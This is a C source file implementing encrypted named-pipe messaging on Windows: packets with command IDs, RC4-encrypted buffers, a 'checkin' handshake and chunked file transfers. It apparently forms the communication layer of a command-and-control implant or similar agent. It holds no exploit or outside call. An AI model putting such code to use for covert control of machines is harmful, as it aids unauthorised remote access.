#include "communication.h"

#include <assert.h>

#include "def.h"
#include "helpers.h"
#include "rc4.h"

packet_t* comm_allocate_packet()
{
    packet_t* request = NULL;

    request = (packet_t*)calloc(1, sizeof(packet_t));
    if (!request)
        h_error("Failed to allocate new packet\n");

    return request;
}

void comm_encrypt_send_data(HANDLE pipe, const uint8_t* buffer,
    uint32_t buffer_size, const uint8_t* key,
    size_t key_size)
{
    assert(INVALID_HANDLE_VALUE != pipe);
    assert(buffer);
    assert(buffer_size);
    assert(key);
    assert(key_size);

    uint8_t* encrypted_buffer = NULL;

    encrypted_buffer = (uint8_t*)calloc(1, buffer_size);
    if (!encrypted_buffer)
        h_error("Failed to allocate encrypted buffer\n");

    memcpy_s(encrypted_buffer, buffer_size, buffer, buffer_size);
    rc4(key, key_size, encrypted_buffer, buffer_size);

    comm_send_data(pipe, encrypted_buffer, buffer_size);

    free(encrypted_buffer);
}

checkin_t* comm_new_checkin(void)
{
    checkin_t* checkin = NULL;

    checkin = (checkin_t*)calloc(1, sizeof(checkin_t));
    if (!checkin)
        h_error("Failed to allocate checkin_t structure\n");

    return checkin;
}

packet_t* comm_new_packet(uint32_t command_id, uint32_t buffer_size)
{
    packet_t* packet = NULL;

    packet = comm_allocate_packet(buffer_size);
    packet->_0.command_id = command_id;
    packet->_1.buffer_size = buffer_size;

    return packet;
}

packet_t* comm_receive_packet(HANDLE pipe)
{
    assert(INVALID_HANDLE_VALUE != pipe);

    packet_t* packet = NULL;

    packet = comm_allocate_packet();
    if (!ReadFile(pipe, packet, sizeof(packet_t), NULL, NULL))
        h_error("Failed to read packet from pipe\n");

    return packet;
}

uint8_t* comm_receive_data(HANDLE pipe, uint32_t data_size)
{
    assert(INVALID_HANDLE_VALUE != pipe);
    assert(data_size);

    uint8_t* buffer = NULL;

    buffer = (uint8_t*)calloc(1, data_size);
    if (!buffer)
        h_error("Failed to allocate buffer\n");

    if (!ReadFile(pipe, buffer, data_size, NULL, NULL))
        h_error("Failed to read data from pipe\n");

    return buffer;
}

checkin_t* comm_receive_checkin(HANDLE pipe, const uint8_t* key,
    size_t key_size)
{
    assert(INVALID_HANDLE_VALUE != pipe);
    assert(key);
    assert(key_size);

    checkin_t* checkin = NULL;

    checkin = comm_new_checkin();
    if (!ReadFile(pipe, checkin, sizeof(checkin_t), NULL, NULL))
        h_error("Failed to read checkin data from pipe\n");

    rc4(key, key_size, (uint8_t*)checkin, sizeof(checkin_t));

    return checkin;
}

uint8_t* comm_receive_decrypt_data(HANDLE pipe, uint32_t buffer_size,
    const uint8_t* key, size_t key_size)
{
    assert(INVALID_HANDLE_VALUE != pipe);
    assert(buffer_size);
    assert(key);
    assert(key_size);

    uint8_t* buffer = NULL;

    buffer = comm_receive_data(pipe, buffer_size);
    rc4(key, key_size, buffer, buffer_size);

    return buffer;
}

void comm_send_command(HANDLE pipe, uint32_t command_id, const uint8_t* buffer,
    uint32_t buffer_size, const uint8_t* key,
    size_t key_size)
{
    assert(INVALID_HANDLE_VALUE != pipe);
    assert(key);
    assert(key_size);

    comm_send_request(pipe, command_id, buffer_size);

    if (buffer && buffer_size)
        comm_encrypt_send_data(pipe, buffer, buffer_size, key, key_size);
}

void comm_send_data(HANDLE pipe, const uint8_t* buffer, uint32_t buffer_size)
{
    assert(INVALID_HANDLE_VALUE != pipe);
    assert(buffer);
    assert(buffer_size);

    uint32_t block_size = BLOCK_SIZE;
    uint32_t n_bytes = 0;
    uint32_t total_size_sent = 0;

    while (total_size_sent < buffer_size)
    {
        n_bytes = 0;
        if (!WriteFile(pipe, &buffer[total_size_sent],
            block_size < (buffer_size - total_size_sent)
            ? block_size
            : buffer_size - total_size_sent,
            (DWORD*)&n_bytes, NULL))
            h_error("Failed to write data to pipe\n");

        total_size_sent += n_bytes;
    }
}

void comm_send_file_write(HANDLE pipe, const uint8_t* data,
    uint32_t data_size)
{
    assert(data);
    assert(data_size);

    comm_send_file_write_size(pipe, data_size);
    comm_send_data(pipe, data, data_size);
}

void comm_send_file_write_size(HANDLE pipe, uint32_t file_size)
{
    assert(INVALID_HANDLE_VALUE != pipe);
    comm_send_request(pipe, 0, file_size);
}

void comm_send_packet(HANDLE pipe, const packet_t* packet)
{
    assert(INVALID_HANDLE_VALUE != pipe);
    assert(packet);

    if (!WriteFile(pipe, packet, sizeof(packet_t), NULL, NULL))
        h_error("Failed to write packet to pipe\n");
}

checkin_t* comm_process_initial_checkin(HANDLE pipe, const uint8_t* key,
    size_t key_size)
{
    assert(INVALID_HANDLE_VALUE != pipe);
    assert(key);
    assert(key_size);

    packet_t* packet = NULL;

    packet = comm_receive_packet(pipe);
    free(packet);

    return comm_receive_checkin(pipe, key, key_size);
}

void comm_send_request(HANDLE pipe, uint32_t command_id, uint32_t buffer_size)
{
    assert(INVALID_HANDLE_VALUE != pipe);

    packet_t* packet = NULL;

    packet = comm_new_packet(command_id, buffer_size);
    comm_send_packet(pipe, packet);

    free(packet);
}